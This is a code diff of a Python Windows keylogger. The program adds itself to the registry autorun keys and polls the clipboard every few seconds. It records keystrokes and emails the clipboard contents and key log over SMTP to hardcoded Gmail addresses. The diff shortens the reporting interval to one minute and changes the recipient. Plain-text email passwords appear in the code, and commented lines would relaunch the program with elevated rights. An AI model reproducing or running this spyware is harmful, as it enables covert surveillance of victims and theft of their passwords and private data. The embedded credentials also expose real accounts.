@@ -19,14 +19,15 @@ import ctypes
 import autorun
 import win32process
 import  shutil
-
+import logging
+import sys
 
 autorun.AddToRegistry()
-hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-if hwnd != 0:      
-    ctypes.windll.user32.ShowWindow(hwnd, 0)      
-    ctypes.windll.kernel32.CloseHandle(hwnd)
-    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
+# if hwnd != 0:      
+#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
+#     ctypes.windll.kernel32.CloseHandle(hwnd)
+#     _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
 
 print('program started')
@@ -35,24 +36,31 @@ comname = getpass.getuser()
 # print(comname)
 temp_data = pyperclip.paste()
 
+# if not os.path.exists('clipboard.txt'):
+#     with open('clipboard.txt', 'a') as clip:
+#         pass
+
+clipboard_data = ''
 
 def clipboard_listener():
-    global temp_data
+    global temp_data, clipboard_data
     if temp_data != pyperclip.paste():
         temp_data = pyperclip.paste()
-        with open('clipboard.txt', 'a') as clip:
-            clip.write(f'\n\n{pyperclip.paste()}')
+        # with open('clipboard.txt', 'a') as clip:
+        #     clip.write(f'\n\n{pyperclip.paste()}')
+        clipboard_data += f'\n\n{pyperclip.paste()}'
     mytimer = Timer(interval=5, function = clipboard_listener)
     mytimer.daemon = True
     mytimer.start()        
 
 def main_func():
+    global clipboard_data
     clipboard_listener()
-    SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
-    EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
-    EMAIL_PASSWORD = "abcd@1234"
-    # EMAIL_ADDRESS = "core.builder11@gmail.com"
-    # EMAIL_PASSWORD = "builder123*"
+    SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
+    # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
+    # EMAIL_PASSWORD = "abcd@1234"
+    EMAIL_ADDRESS = "core.builder11@gmail.com"
+    EMAIL_PASSWORD = "builder123*"
 
     class Keylogger:
         def __init__(self, interval, report_method="email"):
@@ -107,6 +115,7 @@ def main_func():
             print(f"[+] Saved {self.filename}.txt")
 
         def sendmail(self, email, password, message):
+            global clipboard_data
             if not os.path.exists(os.path.join('C://', 'temp')):
                 os.mkdir(os.path.join('C://', 'temp'))
             # _ss_func()
@@ -120,10 +129,10 @@ def main_func():
             # str(Header(f'{comname}<{email}>'))
             # msg["To"] = 'core.builder11@gmail.com'
             # Anshumankumar7890@gmail.com
-            clip_data = ''
-            with open('clipboard.txt', 'r+') as clip: 
-                clip_data = clip.read()           
-                clip.truncate(0)
+            clip_data = clipboard_data
+            # with open('clipboard.txt', 'r+') as clip: 
+            #     clip_data = clip.read()           
+            #     clip.truncate(0)
             email_body = f'\n\nClipboard data:\n {clip_data} \n\n\n\n {message}'
             msg.attach(MIMEText(email_body))
             for i in range(1,4):
@@ -142,13 +151,13 @@ def main_func():
             # login to the email account
             server.login(email, password)
             # send the actual message
-            server.sendmail(email, 'Anshumankumar7890@gmail.com',msg.as_string())
+            server.sendmail(email, 'core.builder11@gmail.com',msg.as_string())
             print('email sent successfully')
             # terminates the session
             server.quit()
             # os.remove('C://temp/')
             shutil.rmtree('C://temp')
-
+            clipboard_data = ''
         def report(self):
             # if self.log:
                 # if there is something in log, report it
@@ -183,5 +192,31 @@ def main_func():
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     keylogger.start()    
     # _ss_func()
-     
-main_func()
+ 
+try:
+    # printf("GeeksforGeeks")
+    
+    main_func()
+except Exception as Argument:
+ 
+     # creating/opening a file
+     f = open("error.txt", "a")
+ 
+     # writing in the file
+     f.write(str(Argument))
+      
+     # closing the file
+     f.close()
+
+# def is_admin():
+#     try:
+#         return ctypes.windll.shell32.IsUserAnAdmin()
+#     except:
+#         return False
+# if is_admin():
+#     main_func()
+#     # Code of your program here
+# else:
+#     # Re-run the program with admin rights
+#     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+#     main_func()
